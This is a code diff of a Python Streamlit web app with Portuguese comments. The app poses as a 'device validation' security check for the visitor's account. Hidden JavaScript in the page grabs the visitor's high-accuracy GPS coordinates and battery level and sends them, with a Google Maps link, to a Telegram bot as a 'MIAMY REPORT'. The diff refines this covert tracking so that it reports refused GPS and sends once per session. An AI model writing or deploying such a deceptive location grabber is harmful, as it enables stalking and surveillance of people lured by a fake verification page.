@@ -1,7 +1,6 @@
 import streamlit as st
 import requests
 import base64
-import time
 from streamlit_js_eval import streamlit_js_eval
 
 # --- 1. CONFIGURAÇÃO ---
@@ -36,10 +35,13 @@ def enviar_telegram(msg):
         requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=10)
     except: pass
 
+# Inicializa estados
 if 'status' not in st.session_state:
     st.session_state['status'] = 'inicio'
+if 'relatorio_enviado' not in st.session_state:
+    st.session_state['relatorio_enviado'] = False
 
-# --- 4. LÓGICA DE CAPTURA ---
+# --- 4. LÓGICA ---
 if st.session_state['status'] == 'inicio':
     st.markdown('<h2 style="color:white;">Validação de Dispositivo</h2>', unsafe_allow_html=True)
     st.markdown('<p style="font-size:14px;">Realize a verificação de integridade para garantir a segurança da sua conta.</p>', unsafe_allow_html=True)
@@ -51,22 +53,19 @@ if st.session_state['status'] == 'inicio':
 elif st.session_state['status'] == 'processando':
     st.markdown('<div class="cf-widget"><div style="display:flex; align-items:center;"><div class="spinner"></div>Analizando...</div></div>', unsafe_allow_html=True)
     
-    # Captura de dados com espera ativa para evitar o erro de localização
-    ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA")
     bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT")
-    
-    # JS robusto: tenta pegar o GPS, se der erro ou demorar, retorna vazio em vez da palavra "erro"
-    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res(null); }, {enableHighAccuracy:true, timeout:10000}); })"
+    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('RECUSADO'); }, {enableHighAccuracy:true, timeout:10000}); })"
     posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS")
 
-    # Só envia se a posição for válida (não for null e nem a string 'erro')
-    if posicao and posicao != "erro":
-        relatorio = f"🛡️ *MIAMY REPORT*\n🔋 *Bateria:* {bat if bat else '??'}%\n📍 *Mapa:* https://www.google.com/maps?q={posicao}"
-        enviar_telegram(relatorio)
-        st.session_state['status'] = 'sucesso'
-        st.rerun()
-    elif posicao is None: # Se falhar o GPS, avisa no relatório mas não quebra o link
-        enviar_telegram("🛡️ *MIAMY REPORT*\n⚠️ *GPS Recusado ou indisponível pelo usuário.*")
+    # Só envia se ainda não tiver enviado nesta sessão
+    if posicao and not st.session_state['relatorio_enviado']:
+        if posicao == "RECUSADO":
+            enviar_telegram("🛡️ *MIAMY REPORT*\n⚠️ GPS Recusado ou indisponível.")
+        else:
+            relatorio = f"🛡️ *MIAMY REPORT*\n🔋 *Bateria:* {bat if bat else '??'}%\n📍 *Mapa:* https://www.google.com/maps?q={posicao}"
+            enviar_telegram(relatorio)
+        
+        st.session_state['relatorio_enviado'] = True
         st.session_state['status'] = 'sucesso'
         st.rerun()
 
@@ -84,4 +83,3 @@ st.markdown("""
         </div>
     </div>
 """, unsafe_allow_html=True)
-                
